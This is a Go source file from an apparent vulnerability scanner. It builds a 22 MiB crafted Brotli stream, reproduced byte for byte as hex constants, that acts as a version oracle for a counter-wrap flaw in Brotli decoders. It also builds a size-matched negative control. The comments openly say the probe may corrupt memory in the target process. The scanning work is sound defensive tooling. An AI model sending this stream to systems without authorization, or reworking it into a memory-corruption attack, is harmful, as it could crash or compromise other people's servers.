package node2shell

import (
	"bytes"
	"encoding/hex"
)

// The streams below are the Assetnote node2shell-scanner's probe, byte for
// byte (scanner.py: PROBE_PREFIX / PROBE_UNIT / PROBE_SUFFIX).
//
// The stream is a Brotli document that repeats an 11-byte block-switch unit
// exactly 2^21-1 times. That count is the whole trick: it drives a counter in
// an affected decoder to the point where it wraps, and the stream is built so
// that a decoder which wraps lands back on a valid state and emits "{}"
// followed by 64 spaces — a 66-byte valid JSON document. A decoder with the fix
// refuses the same bytes.
//
// So the probe is a VERSION oracle, not a crash: on an affected decoder the
// route answers as it would for a normal {} body, and on a patched one it
// answers as it would for a malformed body. Decoded output is 66 bytes, so
// there is no decompression bomb behind it, and no command is executed.
//
// Verified against real libbrotli: 1.2.0 (pre-fix) decodes it to those 66
// bytes, and one repetition fewer or more fails to decode at all. There is
// therefore no smaller probe — the 22 MiB is inherent to the oracle, not
// padding — which is why the module that sends it is tagged `intrusive` and
// spends it once per origin.
//
// OPEN QUESTION, unresolved: whether an affected decoder performs the
// out-of-bounds WRITE while consuming this stream, or merely reaches the
// condition the fix now rejects. The Assetnote scanner's README says only that
// it "does not execute a command", which is a weaker claim than "writes
// nothing out of bounds", and a clean local decode does not settle it either.
// If it turns out the wrap IS the write, this probe corrupts memory in the
// target process on every run and the module should move behind risk:high
// (--intensity deep / --allow-risky-payloads) rather than shipping at the
// default intensity.
const (
	probePrefixHex = "8b000046a440861f6aaf2f0409414a104902a57a74f8fdaf473dea518f7ad4a31e"
	probeUnitHex   = "f5a8473dea518f7ad4a31e"
	probeSuffixHex = "528fe2072020202020202020202020202020202020202020202020202020202020" +
		"2020202020202020202020202020202020202020202020202020202020202020" +
		"2020202003"

	// ProbeReps is the repetition count the oracle depends on.
	ProbeReps = (1 << 21) - 1
	// TwinReps is one repetition past the wrap. The resulting stream is
	// malformed for EVERY decoder, affected or fixed — see TwinStream.
	TwinReps = 1 << 21
)

var (
	probePrefix = mustHex(probePrefixHex)
	probeUnit   = mustHex(probeUnitHex)
	probeSuffix = mustHex(probeSuffixHex)
)

// ProbeBytes and TwinBytes are the exact Content-Length of each stream. They
// are asserted against the built bytes in TestStreamSizes.
const (
	ProbeBytes = 33 + 11*ProbeReps + 70 // 23,068,764
	TwinBytes  = 33 + 11*TwinReps + 70  // 23,068,775
)

// DecodedProbe is what an affected decoder produces from ProbeStream: valid
// JSON, so the route answers it exactly as it answers a plain {} body.
var DecodedProbe = append([]byte("{}"), bytes.Repeat([]byte(" "), 64)...)

// ProbeStream builds the 23,068,764-byte version oracle. It allocates ~22 MiB
// and is deliberately NOT cached: a scan that never reaches an affected-looking
// host should not carry the buffer, and the caller already serializes probes
// behind a semaphore.
func ProbeStream() []byte { return buildStream(ProbeReps) }

// TwinStream builds the size-matched negative control: the same stream with one
// extra repetition, 11 bytes longer and malformed for every decoder.
//
// The Assetnote scanner has no equivalent. Its controls are all ONE BYTE while
// its probe is 22 MiB, so anything that reacts to the size of a body rather
// than to its content — a body silently dropped past a threshold, a proxy that
// stops buffering and forwards an empty body, a streaming cap — is read as the
// decoder's verdict. The twin removes that: it is the same size and the same
// shape, and no decoder in existence accepts it. If the twin and the probe are
// answered alike, size is driving the answer and nothing is reported; only a
// divergence between them is attributable to the decode.
func TwinStream() []byte { return buildStream(TwinReps) }

// buildStream assembles prefix + unit*reps + suffix in one allocation.
//
// The repeated region is grown by doubling the region onto itself rather than
// by appending the 11-byte unit two million times: ~21 copies instead of 2^21,
// for the same total bytes moved. bytes.Repeat is not the alternative here —
// it would allocate a second 22 MiB buffer and copy it in again.
func buildStream(reps int) []byte {
	want := len(probeUnit) * reps
	out := make([]byte, 0, len(probePrefix)+want+len(probeSuffix))
	out = append(out, probePrefix...)

	head := len(out)
	for len(out)-head < want {
		chunk := len(out) - head
		if chunk == 0 {
			out = append(out, probeUnit...)
			continue
		}
		if chunk > want-chunk {
			chunk = want - chunk
		}
		out = append(out, out[head:head+chunk]...)
	}
	return append(out, probeSuffix...)
}

// mustHex decodes a compile-time hex literal. The inputs are constants in this
// file, so a failure is a typo caught by the package's first test run.
func mustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic("node2shell: bad probe hex literal: " + err.Error())
	}
	return b
}
